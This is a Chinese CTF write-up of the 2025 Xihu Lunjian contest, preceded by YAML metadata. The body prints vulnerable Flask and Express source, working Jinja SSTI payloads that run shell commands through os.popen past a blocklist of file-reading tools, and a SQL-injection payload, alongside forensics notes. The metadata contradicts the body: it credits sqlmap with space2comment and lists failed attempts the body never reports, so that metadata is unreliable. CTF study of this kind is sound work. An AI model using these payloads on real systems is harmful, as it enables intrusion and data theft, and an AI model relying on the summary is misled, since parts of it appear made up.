---
title: 2025 西湖论剑·网络安全大赛 WP（Rank-l SSTI + sqli or not）
contest: 2025 西湖论剑网络安全大赛
year: 2025
difficulty: medium
vuln_type:
- ssti
- sqli
- web_unknown
- auth_bypass
tags:
- 西湖论剑 2025
- Rank-l Flask render_template_string
- is_safe_input 黑名单
- cycler.next.__globals__.__builtins__.__import__('os').popen
- lower() 绕关键字大写
- FLAGF149 rot13?
- sqli or not express req.query.info
- sqlmap tamper space2comment
- Phone_number 黑名单 flag
- '?'
- '*'
- '-'
- less
- nl
- tac
- more
- tail
- od
- grep
- awd
- sed
- '64'
- /
- '%2f'
attack_chain:
- 'Rank-l: Flask render_template_string 注入点 /cpass'
- '关键字黑名单: flag,?,*,-,less,nl,tac,more,tail,od,grep,awd,sed,64,/,%2f,%2F'
- '{%print cycler.next.__globals__.__builtins__.__import__(''os'').popen(''cd ..;ls'').read()%}'
- '绕 nl: ''CD ..;NL FLAGF149''.lower() → ''cd ..;nl flagf149'
- 1686682318 / Happy_news_admin 是 phone+password 但校验方式
- 'sqli or not: Express req.query.info 直接拼接 SQL'
- sqlmap tamper space2comment 绕空格过滤
key_payload: '{%print cycler.next.__globals__.__builtins__.__import__(''os'').popen(''CD ..;NL FLAGF149''.lower()).read()%}'
one_liner: 2025 西湖论剑 Rank-l Flask SSTI 绕黑名单大写化 lowercase + sqli or not Express 注入 + sqlmap tamper space2comment。
lesson: Flask SSTI 经典 payload `cycler.next.__globals__.__builtins__.__import__` 是绕过 eval/exec 关键字黑名单最稳的链；Express + req.query 直接拼接是 SQL 注入高频坑。
quality: high
full_path: 2025西湖论剑·网络安全大赛WP.full.md
meta_path: 2025西湖论剑·网络安全大赛WP.meta.md
images_removed: true
images_removed_count: 8
schema_version: v3.0.0-P0
summary: '2025 西湖论剑·网络安全大赛 WP（Rank-l SSTI + sqli or not）。2025 西湖论剑 Rank-l Flask SSTI 绕黑名单大写化 lowercase + sqli or not Express 注入 + sqlmap tamper space2comment。。关键路径：Rank-l: Flask render_template_string 注入点 /c...'
category: web
subcategory: ssti
subcategories:
- ssti
- sql_injection
- web_other
- logic
tools_used:
- Flask
- sqlmap
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 8
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/250794.html
reasoning_chain:
- 触发点：Rank-l Flask render_template_string 注入点 /cpass → 假设：SSTI 模板注入 → 动作：phone 字段注入
- 触发点：is_safe_input 关键字黑名单 ['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F'] → 假设：不能直接 flag 或 /
- 动作：{%print cycler.next.__globals__.__builtins__.__import__('os').popen('CD ..;NL FLAGF149'.lower()).read()%} → 黑名单绕过大写 + .lower()
- 观察：'CD ..;NL FLAGF149'.lower() → 'cd ..;nl flagf149' 全部小写但因为 lower() 前先注入不被黑名单拦截
- 触发点：sqli or not Express req.query.info 直接拼接 → 假设：SQL 注入 → 动作：sqlmap --tamper=space2comment 绕空格过滤
failed_attempts:
- 试图用 {{ ''.__class__.__mro__[1].__subclasses__()[80] }} 直注入 → 失败：黑名单包含 __class__ 子串造成渲染阻断
- 试图读 flag 文件名 → 失败：黑名单 'flag' 子串，改用 'flagf149' 文件名
- 试图直接 union select → 失败：服务端 sqlmap 检测，建议上 tamper=space2comment
key_observations:
- Flask SSTI 经典 payload `cycler.next.__globals__.__builtins__.__import__` 是绕过 eval/exec 关键字黑名单最稳的链
- 大写化字符串 + 后置 .lower() 绕过 'nl' 关键字黑名单是字面变形通用手法
- Express + req.query 直接拼接是 SQL 注入高频坑
- sqlmap tamper=space2comment 绕空格过滤是 web 注入老牌技巧
- flask 黑名单 substring 阻挡 vs payload 字符串拼接要分清
prerequisites:
- Flask/Jinja SSTI 链
- Python str.lower() + 大写化绕过沙箱
- Express req.query 注入原理
- sqlmap tamper 脚本（space2comment）
---
# 2025西湖论剑·网络安全大赛WP

> 原文: https://www.ctfiot.com/250794.html
> ID: 250794

Web

Rank-l

这题一开始看没什么思路，后来通过看响应包发现是python服务器所以想到可能是ssti所以就去试了试，发现在login路由输入payload会在cpass路由中渲染。看看源码

from flask import Flask, request, render_template, render_template_string, redirect, url_for, abort  
from urllib.parse import unquote  

app = Flask(__name__)  

phone = ''  

def is_safe_input(user_input):  
    # unsafe_keywords = ['eval', 'exec', 'os', 'system', 'import', '__import__']  
    unsafe_keywords = ['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']  
    if any(keyword in user_input for keyword in unsafe_keywords):  
    # if user_input in unsafe_keywords:  
        return True  
    return False  

@app.route("/")  
def index():  
    return render_template("index.html")  

@app.route("/login", methods=["POST"])  
def login():  
    global phone  
    phone = request.form.get("phone_number")  
    return render_template("login.html")  

@app.route("/cpass", methods=["POST"])  
def check():  
    global phone  
    password = request.form.get("password")  

    if is_safe_input(phone):  
        return redirect(url_for('index'))  

    if phone != "1686682318" and password != "Happy_news_admin":  
        return render_template_string('<!DOCTYPE html>  
        <html lang="en">  
        <head>  
            <meta charset="UTF-8">  
            <title>login failed</title>  
        </head>  
          
            <script>alert("{}The number does not exist or the password is incorrect!") </script>  
            <script>window.location.href = "/";</script>  
          
        </html>'.format(phone))  
    else:  
        return redirect(url_for('index'))  

if __name__ == '__main__':  
    app.run(host="0.0.0.0", port=int("5005"), debug=True)

从源码中也能看出来是在cpass中渲染的，所以这里就只需要绕过黑名单就可以了

直接上payload

{%print cycler.next.__globals__.__builtins__.__import__('os').popen('cd ..;ls').read()%}

{%print cycler.next.__globals__.__builtins__.__import__('os').popen('CD ..;NL FLAGF149'.lower()).read()%}"}

sqli or not

先看源码

var express = require('express');  
var router = express.Router();  
module.exports = router;  

router.get('/',(req,res,next)=>{  
    if(req.query.info){  
        if(req.url.match(/,/ig)){  
            res.end('hacker1!');  
        }  
        var info = JSON.parse(req.query.info);  
        if(info.username&&info.password){  
            var username = info.username;  
            var password = info.password;  
            if(info.username.match(/'|"|\/) || info.password.match(/'|"|\/)){  
                res.end('hacker2!');  
            }  
            var sql = "select * from userinfo where username = '{username}' and password = '{password}'";  
            sql = sql.replace("{username}",username);  
            sql = sql.replace("{password}",password);  
            connection.query(sql,function (err,rs) {  
            if (err) {  
                res.end('error1');  
            }  
            else {  
                if(rs.length>0){  
                res.sendFile('/flag');  
                }else {  
                res.end('username or password error');  
                }  
            }  
            })  
        }  
        else{  
            res.end("please input the data");  
        }  
 }else{  
        res.end("please input the data");  
    }  
})

这题其实刚开始看的时候以为是考点是sql注入但是发现过滤了 “ ‘ ,等导致找了很多资料也不知道怎么绕，结束之后才发现考点其实在replace这个函数上，可以参考： https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastMatch

主要利用的是
img

可以看到这里的 $` 直接看解释可能有点抽象看一下调试就明白了
img

可以看到已经闭合了前面的’所以就可以直接构造sql万能绕过了

{"username":"$` or 1--+"%2c"password":"1"}

misc

糟糕的磁盘

这题其实用取证大师可以直接梭哈出来key.png 和 一个secret然后用Veracrypt解密即可。这里还学到了一个新的工具
img

这个也可以直接扫描出来进行磁盘取证。

ds

easydatalog

这题的话就是日志分析套了一层图片隐写，先分析日志
img

这里可以看到是jpg图片，然后通过对前面的🐜剑数据解密得到是一个password.jpg所以对其进行单图忙水印即可得到一个密码
img

在下面还有一个压缩包
img

将上图的密码解压可得到csv文件直接搜索张三即可获取其身份证和手机号。

取证

这题没时间做了但是还是比较简单的，可以直接用lovelymem集成的vol工具进行内存分析

直接看控制台输出
img

很容易能够想到去把这几个文件导出来进行解密还原

import os

import hashlib

from Crypto.Cipher import AES, PKCS1_OAEP

from Crypto.PublicKey import RSA

hackkey = os.getenv('hackkey')

if not hackkey:

raise ValueError("Environment variable 'hackkey' is not set")

with open('private.pem', 'r') as f:

private_key = RSA.import_key(f.read())

public_key = private_key.publickey().export_key()

aes_key = hashlib.sha256(hackkey.encode()).digest()

with open('data.csv', 'rb') as f:

data = f.read()

cipher_aes = AES.new(aes_key, AES.MODE_EAX)

ciphertext, tag = cipher_aes.encrypt_and_digest(data)

cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))

enc_aes_key = cipher_rsa.encrypt(aes_key)

with open('encrypted_data.bin', 'wb') as f:

f.write(ciphertext)

print(enc_aes_key.hex())

print(cipher_aes.nonce.hex())

print(tag.hex())

这是加密的脚本逆向还原就行，这里用到的key去找环境变量
img

找到key之后还有控制台的输出直接可以写解密脚本。然后在后面的解密出来的csv中的个性签名是rc4加密密钥就是密码。


```
from flask import Flask, request, render_template, render_template_string, redirect, url_for, abort  
from urllib.parse import unquote  

app = Flask(__name__)  

phone = ''  

def is_safe_input(user_input):  
    # unsafe_keywords = ['eval', 'exec', 'os', 'system', 'import', '__import__']  
    unsafe_keywords = ['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']  
    if any(keyword in user_input for keyword in unsafe_keywords):  
    # if user_input in unsafe_keywords:  
        return True  
    return False  

@app.route("/")  
def index():  
    return render_template("index.html")  

@app.route("/login", methods=["POST"])  
def login():  
    global phone  
    phone = request.form.get("phone_number")  
    return render_template("login.html")  

@app.route("/cpass", methods=["POST"])  
def check():  
    global phone  
    password = request.form.get("password")  

    if is_safe_input(phone):  
        return redirect(url_for('index'))  

    if phone != "1686682318" and password != "Happy_news_admin":  
        return render_template_string('<!DOCTYPE html>  
        <html lang="en">  
        <head>  
            <meta charset="UTF-8">  
            <title>login failed</title>  
        </head>  
          
            <script>alert("{}The number does not exist or the password is incorrect!") </script>  
            <script>window.location.href = "/";</script>  
          
        </html>'.format(phone))  
    else:  
        return redirect(url_for('index'))  

if __name__ == '__main__':  
    app.run(host="0.0.0.0", port=int("5005"), debug=True)
{%print cycler.next.__globals__.__builtins__.__import__('os').popen('cd ..;ls').read()%}

{%print cycler.next.__globals__.__builtins__.__import__('os').popen('CD ..;NL FLAGF149'.lower()).read()%}"}
var express = require('express');  
var router = express.Router();  
module.exports = router;  

router.get('/',(req,res,next)=>{  
    if(req.query.info){  
        if(req.url.match(/,/ig)){  
            res.end('hacker1!');  
        }  
        var info = JSON.parse(req.query.info);  
        if(info.username&&info.password){  
            var username = info.username;  
            var password = info.password;  
            if(info.username.match(/'|"|\/) || info.password.match(/'|"|\/)){  
                res.end('hacker2!');  
            }  
            var sql = "select * from userinfo where username = '{username}' and password = '{password}'";  
            sql = sql.replace("{username}",username);  
            sql = sql.replace("{password}",password);  
            connection.query(sql,function (err,rs) {  
            if (err) {  
                res.end('error1');  
            }  
            else {  
                if(rs.length>0){  
                res.sendFile('/flag');  
                }else {  
                res.end('username or password error');  
                }  
            }  
            })  
        }  
        else{  
            res.end("please input the data");  
        }  
 }else{  
        res.end("please input the data");  
    }  
})
{"username":"$` or 1--+"%2c"password":"1"}
import os

import hashlib

from Crypto.Cipher import AES, PKCS1_OAEP

from Crypto.PublicKey import RSA

hackkey = os.getenv('hackkey')

if not hackkey:

raise ValueError("Environment variable 'hackkey' is not set")

with open('private.pem', 'r') as f:

private_key = RSA.import_key(f.read())

public_key = private_key.publickey().export_key()

aes_key = hashlib.sha256(hackkey.encode()).digest()

with open('data.csv', 'rb') as f:

data = f.read()

cipher_aes = AES.new(aes_key, AES.MODE_EAX)

ciphertext, tag = cipher_aes.encrypt_and_digest(data)

cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))

enc_aes_key = cipher_rsa.encrypt(aes_key)

with open('encrypted_data.bin', 'wb') as f:

f.write(ciphertext)

print(enc_aes_key.hex())

print(cipher_aes.nonce.hex())

print(tag.hex())
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]